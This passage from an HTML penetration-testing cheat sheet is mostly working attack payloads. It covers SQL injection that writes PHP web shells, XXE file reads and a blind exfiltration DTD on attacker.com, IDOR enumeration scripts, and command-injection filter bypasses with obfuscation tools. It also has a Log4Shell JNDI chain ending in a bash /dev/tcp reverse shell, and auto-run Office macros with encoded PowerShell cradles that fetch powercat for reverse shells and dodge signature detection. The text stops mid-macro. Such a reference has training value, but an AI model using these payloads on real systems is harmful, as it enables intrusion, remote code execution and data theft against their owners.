              <ul>
                <li>Write a File:</li>
              </ul>
              <pre><code class="language-sql">SELECT &quot;&lt;?php echo shell_exec($_GET[&#39;c&#39;]);?&gt;&quot; INTO OUTFILE &#39;/var/www/html/webshell.php&#39;;
-- or, using the ?cmd=[command] format
SELECT &quot;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&quot; into outfile &quot;C:\\xampp\\htdocs\\backdoor.php&quot;
</code></pre>
              <ul>
                <li>Other Commands:</li>
              </ul>
              <pre><code class="language-sql">-- Check MySQL version
SELECT version();

-- Get system user
SELECT system_user();

-- List databases
SHOW DATABASES;

-- List users and their passwords (authentication_string)
SELECT user, authentication_string FROM mysql.user WHERE user = &#39;&lt;username&gt;&#39;;

-- Database User Enumeration
SELECT user FROM mysql.user;

-- Privilege Escalation
GRANT ALL PRIVILEGES ON *.* TO &#39;&lt;username&gt;&#39;@&#39;%&#39; WITH GRANT OPTION;
FLUSH PRIVILEGES;

# Test SQLi in every input field
&#39;;#---
</code></pre>
              <h6 id="35423-remote-code-execution-rce">3.5.4.2.3 Remote Code Execution (RCE)</h6>
              <p>For <code>mysql</code> the idea is to write a php file that will lead to command execution via a web
                app.</p>
              <pre><code class="language-sql">-- General payload
SELECT &quot;&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;&quot; INTO OUTFILE &quot;/var/www/html/webshell.php&quot;

-- Using UNION
&#39; union select &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; into outfile &#39;/srv/http/shell.php&#39; -- -

-- Windows Payload
SELECT &quot;&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;&quot; INTO OUTFILE &quot;C:/wamp/www/shell.php&quot; 
</code></pre>
              <h6 id="35424-extra-references">3.5.4.2.4 Extra References</h6>
              <ul>
                <li><a
                    href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL Injection/MySQL Injection.md">PayloadsAllTheThings
                    MSSQL Injection</a></li>
              </ul>
              <h5 id="3543-mariadb">3.5.4.3 MariaDB</h5>
              <h6 id="35431-common-commands">3.5.4.3.1 Common Commands</h6>
              <ul>
                <li><strong>Basic SQL Injection:</strong></li>
              </ul>
              <pre><code class="language-sql">admin &#39; OR 1=1 -- 
</code></pre>
              <ul>
                <li><strong>Alternative Syntax:</strong></li>
              </ul>
              <pre><code class="language-sql">1&#39; OR 1 = 1 #
</code></pre>
              <ul>
                <li><strong>Union-Based Data Extraction (Column Guessing):</strong></li>
              </ul>
              <pre><code class="language-sql">&#39; UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema=database()-- 
</code></pre>
              <ul>
                <li><strong>Extract Table and Column Information:</strong></li>
              </ul>
              <pre><code class="language-sql">&#39; UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()-- 
&#39; UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=&#39;&lt;table_name&gt;&#39;-- 
</code></pre>
              <ul>
                <li><strong>Extract Data from Target Table:</strong></li>
              </ul>
              <pre><code class="language-sql">&#39; UNION SELECT &lt;column1&gt;, &lt;column2&gt; FROM &lt;table_name&gt;-- 
</code></pre>
              <h6 id="35432-extra-references">3.5.4.3.2 Extra References</h6>
              <ul>
                <li><a href="https://github.com/whatbe/nmap-scripts/blob/master/mariadb.mysqldump"
                    target="_blank">MariaDB SQL Injection
                    Example</a></li>
              </ul>
              <h5 id="3544-oracle">3.5.4.4 Oracle</h5>
              <h6 id="35441-common-commands">3.5.4.4.1 Common Commands</h6>
              <ul>
                <li><strong>Union SQL Injection with <code>dual</code> Table:</strong> Oracle databases often use the
                  <code>dual</code> table for testing purposes.
                </li>
              </ul>
              <pre><code class="language-sql">&#39; UNION SELECT 1,2,3,4,5 FROM dual-- 
</code></pre>
              <ul>
                <li><strong>Correcting Number of Columns:</strong> adjust the number of columns to avoid errors.</li>
              </ul>
              <pre><code class="language-sql">&#39; UNION SELECT 1,2,3 FROM dual-- 
</code></pre>
              <ul>
                <li><strong>Retrieve User Information:</strong> extract usernames from Oracle&rsquo;s internal tables.
                </li>
              </ul>
              <pre><code class="language-sql">&#39; UNION SELECT username, NULL, NULL FROM all_users-- 
</code></pre>
              <ul>
                <li><strong>Dump Table and Column Names:</strong> extract table names and column names from the Oracle
                  database.</li>
              </ul>
              <pre><code class="language-sql">&#39; UNION SELECT table_name, NULL, NULL FROM all_tables-- 
&#39; UNION SELECT column_name, NULL, NULL FROM all_tab_columns WHERE table_name=&#39;&lt;table_name&gt;&#39;-- 
</code></pre>
              <ul>
                <li><strong>Dump Data from Table:</strong> finally, retrieve specific data from a target table.</li>
              </ul>
              <pre><code class="language-sql">&#39; UNION SELECT &lt;column_name&gt;, NULL FROM &lt;table_name&gt;-- 
</code></pre>
              <h6 id="35442-login-bypass">3.5.4.4.2 Login Bypass</h6>
              <ul>
                <li>Example of bypassing Oracle DB login:</li>
              </ul>
              <pre><code class="language-sql">admin &#39; OR 1=1 -- 
</code></pre>
              <h6 id="35443-union-based-injection-dump-creds">3.5.4.4.3 Union-Based Injection (Dump Creds)</h6>
              <ul>
                <li><a
                    href="https://web.archive.org/web/20220727065022/https://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html">Reference:
                    SecurityIdiots Oracle Injection</a></li>
              </ul>
              <h3 id="36-xxe-xml-external-entity-injection">3.6 XXE (XML External Entity) Injection</h3>
              <h4 id="361-identifying">3.6.1 Identifying</h4>
              <p>XXE vulnerabilities occur when an application parses XML input from untrusted sources and processes
                external entities. An attacker can manipulate the XML content to read sensitive files from the system;
                these are the parts of the XML file.</p>
              <table class="custom-table">
                <thead>
                  <tr>
                    <th>Key</th>
                    <th>Definition</th>
                    <th>Example</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td>Tag</td>
                    <td>The keys of an XML document, usually wrapped with (&lt;/&gt;) characters.</td>
                    <td><code>&lt;date&gt;</code></td>
                  </tr>
                  <tr>
                    <td>Entity</td>
                    <td>XML variables, usually wrapped with (&amp;/;) characters.</td>
                    <td><code>&amp;lt;</code></td>
                  </tr>
                  <tr>
                    <td>Element</td>
                    <td>The root element or any of its child elements, and its value is stored in between a start-tag
                      and an end-tag.</td>
                    <td><code>&lt;date&gt;01-01-2022&lt;/date&gt;</code></td>
                  </tr>
                  <tr>
                    <td>Attribute</td>
                    <td>Optional specifications for any element that are stored in the tags, which may be used by the
                      XML parser.c</td>
                    <td><code>version=&quot;1.0&quot;/encoding=&quot;UTF-8&quot;</code></td>
                  </tr>
                  <tr>
                    <td>Declaration</td>
                    <td>Usually the first line of an XML document, and defines the XML version and encoding to use when
                      parsing it.</td>
                    <td><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code></td>
                  </tr>
                </tbody>
              </table>
              <h4 id="362-local-file-disclosure">3.6.2 Local File Disclosure</h4>
              <p>In this case data is being sent in the XML, so we can change it and test different variables
                (<code>&amp;[variable];</code>) to display information.</p>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/xee01.png" class="img-fluid" alt="XEE Payload">
                  <figcaption class="figure-caption text-center">XEE Local File Disclosure Payload</figcaption>
                </figure>
              </div>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/xee02.png" class="img-fluid" alt="XEE Result">
                  <figcaption class="figure-caption text-center">XEE File Disclosure Result</figcaption>
                </figure>
              </div>
              <h4 id="363-reading-sensitive-files">3.6.3 Reading Sensitive Files</h4>
              <p>Consider that in certain Java web applications, we may also be able to specify a directory instead of a
                file, and we will get a directory listing instead, which can be useful for locating sensitive files.</p>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/xee03.png" class="img-fluid" alt="XEE Reading Sensitive Files">
                  <figcaption class="figure-caption text-center">XEE Reading Sensitive Files</figcaption>
                </figure>
              </div>
              <ul>
                <li><strong>Reading the <code>/etc/passwd</code> File</strong></li>
              </ul>
              <pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
&lt;!DOCTYPE foo [
   &lt;!ELEMENT foo ANY &gt;
   &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
</code></pre>
              <ul>
                <li><strong>Reading a Custom File</strong></li>
              </ul>
              <pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE config [
   &lt;!ELEMENT config ANY &gt;
   &lt;!ENTITY readConfig SYSTEM &quot;file:///etc/myconfig.conf&quot; &gt;]&gt;
&lt;config&gt;&amp;readConfig;&lt;/config&gt;
</code></pre>
              <ul>
                <li><strong>Accessing Local Files</strong></li>
              </ul>
              <pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE data [
   &lt;!ELEMENT data ANY &gt;
   &lt;!ENTITY localHosts SYSTEM &quot;file:///etc/hosts&quot; &gt;]&gt;
&lt;data&gt;&amp;localHosts;&lt;/data&gt;
</code></pre>
              <ul>
                <li><strong>Blind XXE</strong></li>
              </ul>
              <pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE request [
   &lt;!ENTITY % remote SYSTEM &quot;http://attacker.com/malicious.dtd&quot;&gt;
   &lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;file:///etc/passwd&#39;&gt;&quot;&gt;
   %remote;
   %all;
]&gt;
&lt;request&gt;&amp;send;&lt;/request&gt;
</code></pre>
              <ul>
                <li><strong>XXE with Network Access</strong></li>
              </ul>
              <pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE request [
   &lt;!ELEMENT request ANY &gt;
   &lt;!ENTITY xxe SYSTEM &quot;http://attacker.com/secret.txt&quot; &gt;]&gt;
&lt;request&gt;&amp;xxe;&lt;/request&gt;
</code></pre>
              <h4 id="364-reading-source-code">3.6.4 Reading Source Code</h4>
              <p>In this case we need to be careful because if we are referencing something that is not in proper XML
                format the <em>External XML Entity</em> vulnerability will not work, this can happens if the file
                contains XML special characters (eg. <code>| &lt; &gt; { } &amp;</code>); for these cases we could
                <strong>base64 encode them</strong>.
              </p>
              <pre><code class="language-xml">&lt;!DOCTYPE email [
  &lt;!ENTITY company SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt;
]&gt;
</code></pre>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/xee04.png" class="img-fluid" alt="XEE Reading Source Code">
                  <figcaption class="figure-caption text-center">XEE Reading Source Code</figcaption>
                </figure>
              </div>
              <h4 id="365-remote-code-execution">3.6.5 Remote Code Execution</h4>
              <p>In this case we need to be <strong>careful with special characters
                  (<code>| &lt; &gt; { } &amp;</code>)</strong> as well, as they will break our command, you could even
                consider encode them. For case see that in example below we replaced all spaces in the above XML code
                with <strong>$IFS</strong>, to avoid breaking the XML syntax.</p>
              <pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE email [
  &lt;!ENTITY company SYSTEM &quot;expect://curl$IFS-O$IFS&#39;OUR_IP/shell.php&#39;&quot;&gt;
]&gt;
&lt;root&gt;
&lt;name&gt;&lt;/name&gt;
&lt;tel&gt;&lt;/tel&gt;
&lt;email&gt;&amp;company;&lt;/email&gt;
&lt;message&gt;&lt;/message&gt;
&lt;/root&gt;
</code></pre>
              <h3 id="37-idor-insecure-direct-object-references">3.7 IDOR (Insecure Direct Object References)</h3>
              <p>For example, if users request access to a file they recently uploaded, they may get a link to it such
                as (<strong>download.php?file_id=123</strong>). So, as the link directly references the file with
                (<strong>file_id=123</strong>), what would happen if we tried to access another file (which may not
                belong to us) with (<strong>download.php?file_id=124</strong>) If we can access it that means there is a
                broken access control.</p>
              <h4 id="371-enumeration">3.7.1 Enumeration</h4>
              <p>Whenever we receive a specific file or resource, we should study the HTTP requests to look for URL
                parameters or APIs with an object reference (<strong>e.g. ?uid=1 or ?filename=file_1.pdf</strong>).
                These are mostly found in URL parameters or APIs but may also be found in other HTTP headers, like
                cookies.</p>
              <p>Another example could be that the UID of the user is being used by adding it to a part of the filename,
                from the example below we can see that there could be no access control and therefore create a script to
                perform the enumeration of all files:</p>
              <pre><code class="language-bash"># UID=1
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf

# UID=2
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
</code></pre>
              <pre><code class="language-bash"># Script with regex to find the documents
#!/bin/bash

url=&quot;http://SERVER_IP:PORT&quot;

for i in {1..10}; do
        for link in $(curl -s &quot;$url/documents.php?uid=$i&quot; | grep -oP &quot;\/documents.*?.pdf&quot;); do
                wget -q $url/$link
        done
done
</code></pre>
              <pre><code class="language-bash"># Alternative script option to find any extension
#!/bin/bash

url=&quot;http://SERVER_IP:PORT&quot;

for i in {1..20}; do
    for link in $(curl -s -X POST -d &quot;uid=$i&quot; &quot;$url/documents.php&quot; | grep -oP &quot;\/documents.*?\\.\\w+&quot;); do
        curl -O $url/$link
    done
done
</code></pre>
              <h4 id="372-ajax-calls">3.7.2 AJAX Calls</h4>
              <p>We may also be able to identify unused parameters or APIs in the front-end code in the form of
                JavaScript AJAX calls. Some web applications developed in JavaScript frameworks may insecurely place all
                function calls on the front-end and use the appropriate ones based on the user role.</p>
              <pre><code class="language-javascript">// Code Example
function changeUserPassword() {
    $.ajax({
        url:&quot;change_password.php&quot;,
        type: &quot;post&quot;,
        dataType: &quot;json&quot;,
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
</code></pre>
              <p>The above function may never be called when we use the web application as a non-admin user. However, if
                we locate it in the front-end code, we may test it in different ways to see whether we can call it to
                perform changes, which would indicate that it is vulnerable to IDOR. We can do the same with back-end
                code if we have access to it.</p>
              <h4 id="373-hashing--encoding">3.7.3 Hashing &amp; Encoding</h4>
              <p>Sometimes the reference is encoded or hashed (<em>file_123.pdf</em>):</p>
              <ul>
                <li>Encoded: <code>download.php?filename=ZmlsZV8xMjMucGRm</code></li>
                <li>Hashed: <code>download.php?filename=c81e728d9d4c2f636f067f89cc14862c</code></li>
              </ul>
              <pre><code class="language-javascript">$.ajax({
    url:&quot;download.php&quot;,
    type: &quot;post&quot;,
    dataType: &quot;json&quot;,
    data: {filename: CryptoJS.MD5(&#39;file_1.pdf&#39;).toString()},
    success:function(result){
        //
    }
});
</code></pre>
              <h4 id="374-compare-user-roles">3.7.4 Compare User Roles</h4>
              <p>If we want to perform more advanced IDOR attacks, we may need to register multiple users and compare
                their HTTP requests and object references. This may allow us to understand how the URL parameters and
                unique identifiers are being calculated and then calculate them for other users to gather their data.
              </p>
              <p>If we have 2 users one of which can view the salary with the API call; repeat the same API call as
                <code>User2</code> . If it works means that the web app requires only a valid logged-in session to make
                API call but there is<strong>no access control on backend to verify the data being called by the
                  user</strong> :
              </p>
              <pre><code class="language-json">{
  &quot;attributes&quot; : 
    {
      &quot;type&quot; : &quot;salary&quot;,
      &quot;url&quot; : &quot;/services/data/salaries/users/1&quot;
    },
  &quot;Id&quot; : &quot;1&quot;,
  &quot;Name&quot; : &quot;User1&quot;
}
</code></pre>
              <h4 id="375-insecure-apis">3.7.5 Insecure APIs</h4>
              <p>We could see calls to APIs like the one below, in such cases we can perform enumeration of the API
                similar to the web application, if there is some form of backend control, we could try changing both the
                UID (for this example) and the URL.</p>
              <pre><code class="language-json">{
    &quot;uid&quot;: 1,
    &quot;uuid&quot;: &quot;40f5888b67c246df7efba008e7c2f9d2&quot;,
    &quot;role&quot;: &quot;employee&quot;,
    &quot;full_name&quot;: &quot;emma LastName&quot;,
    &quot;email&quot;: &quot;emma@employees.com&quot;,
    &quot;about&quot;: &quot;A pentester and red teamer.&quot;
}
</code></pre>
              <h3 id="38-command-injections">3.8 Command Injections</h3>
              <h4 id="381-identifying">3.8.1 Identifying</h4>
              <ul>
                <li><strong>Detect Windows Commands Execution:</strong></li>
              </ul>
              <pre><code class="language-powershell"># Check if we are executing PowerShell or CMD
(dir 2&gt;&amp;1 *`|echo CMD);&amp;&lt;# rem #&gt;echo PowerShell
</code></pre>
              <ul>
                <li><strong>Vulnerable Code Example</strong>:</li>
              </ul>
              <pre><code class="language-php">&lt;?php
if (isset($_GET[&#39;filename&#39;])) {
    system(&quot;touch /tmp/&quot; . $_GET[&#39;filename&#39;] . &quot;.pdf&quot;);
}
?&gt;

app.get(&quot;/createfile&quot;, function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
</code></pre>
              <ul>
                <li><strong>Executing Command Injection:</strong></li>
              </ul>
              <pre><code class="language-bash">curl -X POST --data &#39;Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F&lt;ATTACKER_IP&gt;%2Fpowercat.ps1%22)%3Bpowercat%20-c%20&lt;ATTACKER_IP&gt;%20-p%20&lt;PORT&gt;%20-e%20powershell&#39; http://&lt;TARGET&gt;:&lt;PORT&gt;/archive
</code></pre>
              <h4 id="382-command-methods">3.8.2 Command Methods</h4>
              <p>The only exception may be the semi-colon <code>;</code>, which will not work if the command was being
                executed with Windows Command Line (CMD), but would still work if it was being executed with Windows
                PowerShell.</p>
              <table class="custom-table">
                <thead>
                  <tr>
                    <th>Injection Operator</th>
                    <th>Injection Character</th>
                    <th>URL-Encoded Character</th>
                    <th>Executed Command</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td>Semicolon</td>
                    <td><code>;</code></td>
                    <td><code>%3b</code></td>
                    <td>Both</td>
                  </tr>
                  <tr>
                    <td>New Line</td>
                    <td></td>
                    <td><code>%0a</code></td>
                    <td>Both</td>
                  </tr>
                  <tr>
                    <td>Background</td>
                    <td><code>&amp;</code></td>
                    <td><code>%26</code></td>
                    <td>Both (second output generally shown first)</td>
                  </tr>
                  <tr>
                    <td>Pipe</td>
                    <td><code>|</code></td>
                    <td><code>%7c</code></td>
                    <td>Both (only second output is shown)</td>
                  </tr>
                  <tr>
                    <td>AND</td>
                    <td><code>&amp;&amp;</code></td>
                    <td><code>%26%26</code></td>
                    <td>Both (only if first succeeds)</td>
                  </tr>
                  <tr>
                    <td>OR</td>
                    <td><code>|</code></td>
                    <td><code>%7c%7c</code></td>
                    <td>Second (only if first fails)</td>
                  </tr>
                  <tr>
                    <td>Sub-Shell</td>
                    <td>``</td>
                    <td><code>%60%60</code></td>
                    <td>Both (Linux-only)</td>
                  </tr>
                  <tr>
                    <td>Sub-Shell</td>
                    <td><code>$()</code></td>
                    <td><code>%24%28%29</code></td>
                    <td>Both (Linux-only)</td>
                  </tr>
                </tbody>
              </table>
              <h4 id="383-bypassing-filters">3.8.3 Bypassing Filters</h4>
              <h5 id="3831-space-is-blacklisted">3.8.3.1 Space is Blacklisted</h5>
              <ul>
                <li>Use <code>%09</code> (tab).</li>
                <li>Use <code>$IFS</code></li>
                <li>Use Brace expansion i.e <code>{ls,-la}</code></li>
              </ul>
              <h5 id="3832--or--are-blacklisted">3.8.3.2 <code>/</code> or <code>\</code> are Blacklisted</h5>
              <ul>
                <li>Linux: use environment paths.</li>
              </ul>
              <pre><code class="language-bash"># to select /
echo ${PATH:0:1}
</code></pre>
              <ul>
                <li>Windows: use environment paths.</li>
              </ul>
              <pre><code class="language-powershell"># to select \
$env:HOMEPATH[0]
</code></pre>
              <h5 id="3833-commands-are-blacklisted">3.8.3.3 Commands are Blacklisted</h5>
              <ul>
                <li><strong>Example of code</strong> that has blacklisted commands:</li>
              </ul>
              <pre><code class="language-javascript">$blacklist = [&#39;whoami&#39;, &#39;cat&#39;, ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos(&#39;$_POST[&#39;ip&#39;]&#39;, $word) !== false) {
        echo &quot;Invalid input&quot;;
    }
}
</code></pre>
              <ul>
                <li><strong>General Solution</strong>: add Characters that are ignored by the shell.</li>
              </ul>
              <pre><code class="language-txt">` or &quot;

Example: w&#39;h&#39;o&#39;am&#39;i
</code></pre>
              <ul>
                <li><strong>Linux Only</strong>: add <code>\</code> or <code>$@</code></li>
              </ul>
              <pre><code class="language-txt">Examples:
- who$@ami
- w\ho\am\i
</code></pre>
              <ul>
                <li><strong>Windows Only</strong>: add <code>^</code></li>
              </ul>
              <pre><code class="language-txt">Example:
- who^ami
</code></pre>
              <h5 id="3834-reverse-commands">3.8.3.4 Reverse Commands</h5>
              <pre><code class="language-bash"># Linux
echo &#39;whoami&#39; | rev

# To execute:
$(rev&lt;&lt;&lt;&#39;imaohw&#39;)
</code></pre>
              <pre><code class="language-powershell"># Windows
&quot;whoami&quot;[-1..-20] -join &#39;&#39;

# To execute:
iex &quot;$(&#39;imaohw&#39;[-1..-20] -join &#39;&#39;)&quot;
</code></pre>
              <h5 id="3835-encoded-commands">3.8.3.5 Encoded Commands</h5>
              <pre><code class="language-bash"># Linux
echo -n &#39;cat /etc/passwd | grep 33&#39; | base64

# To execute (note that we are using &lt;&lt;&lt; to avoid using a pipe |, which is a filtered character):
bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
</code></pre>
              <pre><code class="language-powershell">[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(&#39;whoami&#39;))

# To execute:
iex &quot;$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(&#39;dwBoAG8AYQBtAGkA&#39;)))
</code></pre>
              <h4 id="384-automatic-tools">3.8.4 Automatic Tools</h4>
              <ul>
                <li><strong>Linux (Bashfuscator)</strong></li>
              </ul>
              <pre><code class="language-bash"># Installation
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user

# Usage
cd ./bashfuscator/bin/
./bashfuscator -h
./bashfuscator -c &#39;cat /etc/passwd&#39;

# Example
./bashfuscator -c &#39;cat /etc/passwd&#39; -s 1 -t 1 --no-mangling --layers 1
</code></pre>
              <ul>
                <li><strong>Windows (DOSfuscation</strong>)</li>
              </ul>
              <pre><code class="language-powershell"># Installation
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation

# Usage
Invoke-DOSfuscation&gt; SET COMMAND type C:\Users\htb-student\Desktop\flag.txt

Invoke-DOSfuscation&gt; encoding
Invoke-DOSfuscation\Encoding&gt; 1
</code></pre>
              <h3 id="39-log4shell">3.9 Log4Shell</h3>
              <ol>
                <li>
                  <p><strong>Identify a Vulnerable System</strong></p>
                </li>
                <li>
                  <p><strong>Craft the Exploit Payload</strong>: these payloads are <strong>not reverse
                      shells</strong> themselves but are the <strong>triggering mechanism</strong> to call back to your
                    server, allowing you to serve more malicious content, like a reverse shell, when the server reaches
                    out to your attacker-controlled LDAP or RMI server.</p>
                </li>
              </ol>
              <pre><code class="language-bash"># LDAP Payload
${jndi:ldap://attacker-server.com:1389/a}

# RMI Payload
${jndi:rmi://attacker-server.com:1099/a}
</code></pre>
              <ol start="3">
                <li><strong>Inject the Payload</strong></li>
              </ol>
              <pre><code class="language-bash"># Using Curl
curl -X GET &#39;http://target-server.com:8080/?search=${jndi:ldap://attacker-server.com:1389/a}&#39;

# Using Headers Injection
curl -X GET http://target-server.com -H &quot;User-Agent: ${jndi:ldap://attacker-server.com:1389/a}&quot;

# Using POST Data Injection
curl -X POST http://target-server.com/login -d &quot;username=${jndi:ldap://attacker-server.com:1389/a}&amp;password=test&quot;
</code></pre>
              <ol start="4">
                <li><strong>Setup the Listener</strong></li>
              </ol>
              <pre><code class="language-bash">nc -lvnp [listening_port]
</code></pre>
              <ol start="5">
                <li><strong>Get the Reverse Shell</strong>: in this step, after you successfully trigger the JNDI
                  injection (from Step 2), you deliver a <strong>reverse shell payload</strong> or any other malicious
                  code to execute commands on the target server.</li>
              </ol>
              <pre><code class="language-bash"># You can also use a tool like ysoserial (for Windows) to generate the payload.

# Bash reverse shell payload
bash -i &gt;&amp; /dev/tcp/attacker-server.com/[listening_port] 0&gt;&amp;1

# Use the reverse shell payload
${jndi:ldap://attacker-server.com:1389/bash-reverse-shell}
</code></pre>
              <h3 id="310-exploiting-cves">3.10 Exploiting CVEs</h3>
              <pre><code class="language-plaintext">CVE-2014-6287 https://www.exploit-db.com/exploits/49584 #HFS (HTTP File Server) 2.3.x - Remote Command Execution

CVE-2015-6518 https://www.exploit-db.com/exploits/24044 phpliteadmin &lt;= 1.9.3 Remote PHP Code Injection Vulnerability

CVE-XXXX-XXXX https://www.exploit-db.com/exploits/25971 Cuppa CMS - &#39;/alertConfigField.php&#39; Local/Remote File Inclusion

CVE-2009-4623 https://www.exploit-db.com/exploits/9623  Advanced comment system1.0  Remote File Inclusion Vulnerability
https://github.com/hupe1980/CVE-2009-4623/blob/main/exploit.py

CVE-2018-18619 https://www.exploit-db.com/exploits/45853 Advanced Comment System 1.0 - SQL Injection
</code></pre>

              <h2 id="4-client-side-attacks">4. <span class="emoji">üë•</span> Client-Side Attacks</h2>
              <h3 id="41-macros">4.1 MACROS</h3>
              <p><strong>Auto-Executing PowerShell on Document Open</strong></p>
              <pre><code class="language-vba">Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    CreateObject(&quot;Wscript.Shell&quot;).Run &quot;powershell&quot;
End Sub
</code></pre>
              <p><strong>Passing Command as a String Variable</strong></p>
              <pre><code class="language-vba">Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim cmdStr As String
    cmdStr = &quot;[Your PowerShell Command]&quot;
    CreateObject(&quot;Wscript.Shell&quot;).Run cmdStr
End Sub
</code></pre>
              <p><strong>PowerShell Download Cradle with PowerCat Reverse Shell</strong></p>
              <pre><code class="language-powershell">IEX(New-Object System.Net.WebClient).DownloadString(&#39;[http://your-server/powercat.ps1]&#39;);powercat -c [attacker-ip] -p [port] -e powershell
</code></pre>
              <p><strong>Base64 Payload Encoding</strong></p>
              <pre><code class="language-powershell">$text = &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#39;[http://your-server/payload.ps1]&#39;);powercat -c [attacker-ip] -p [port] -e powershell&quot;
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($text))
Write-Output $encoded
</code></pre>
              <p><strong>Python Script to Split Base64 PowerShell Command</strong></p>
              <pre><code class="language-python">cmd_str = &quot;[Your Base64 Encoded PowerShell Command]&quot;

chunk_size = 50

for i in range(0, len(cmd_str), chunk_size):
    print(f&#39;Str = Str + &quot;{cmd_str[i:i+chunk_size]}&quot;&#39;)
</code></pre>
              <p><strong>Macro for PowerShell Reverse Shell using Encoded Command</strong></p>
              <pre><code class="language-vba">Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim encodedCmd As String

    encodedCmd = encodedCmd + &quot;[Base64 Chunk 1]&quot;
    encodedCmd = encodedCmd + &quot;[Base64 Chunk 2]&quot;
    encodedCmd = encodedCmd + &quot;...&quot;
    encodedCmd = encodedCmd + &quot;[Base64 Chunk N]&quot;

    CreateObject(&quot;Wscript.Shell&quot;).Run &quot;powershell.exe -nop -w hidden -enc &quot; &amp; encodedCmd
End Sub
</code></pre>
              <h3 id="42-windows-library-files">4.2 Windows Library Files</h3>
              <p><strong>Running the WebDav Server in Kali</strong></p>
              <pre><code class="language-bash">wsgidav --host=0.0.0.0 --port=[port] --auth=anonymous --root /path/to/webdav/
</code></pre>
              <p><strong>Cradle Download and Execute Script via LNK File</strong></p>
              <pre><code class="language-powershell"># Create the file as a shortcut in the Windows system to prepare the attack
powershell.exe -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#39;[http://your-server/payload.ps1]&#39;);powercat -c [attacker-ip] -p [port] -e powershell&quot;
</code></pre>
              <p><strong>Example <code>.Library-ms</code> File Configuration</strong></p>
              <pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;libraryDescription xmlns=&quot;http://schemas.microsoft.com/windows/2009/library&quot;&gt;
    &lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;
    &lt;version&gt;6&lt;/version&gt;
    &lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;
    &lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;
    &lt;templateInfo&gt;
        &lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;
    &lt;/templateInfo&gt;
    &lt;searchConnectorDescriptionList&gt;
        &lt;searchConnectorDescription&gt;
            &lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;
            &lt;isSupported&gt;false&lt;/isSupported&gt;
            &lt;simpleLocation&gt;
                &lt;url&gt;[http://your-server]&lt;/url&gt;
            &lt;/simpleLocation&gt;
        &lt;/searchConnectorDescription&gt;
    &lt;/searchConnectorDescriptionList&gt;
&lt;/libraryDescription&gt;
</code></pre>
              <h3 id="43-advanced-exploitation">4.3 Advanced Exploitation</h3>
              <p><strong>String Concatenation to Bypass Signature Detection</strong></p>
              <pre><code class="language-vba">Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim cmdStr As String
    cmdStr = &quot;powe&quot; &amp; &quot;rshe&quot; &amp; &quot;ll.exe&quot;
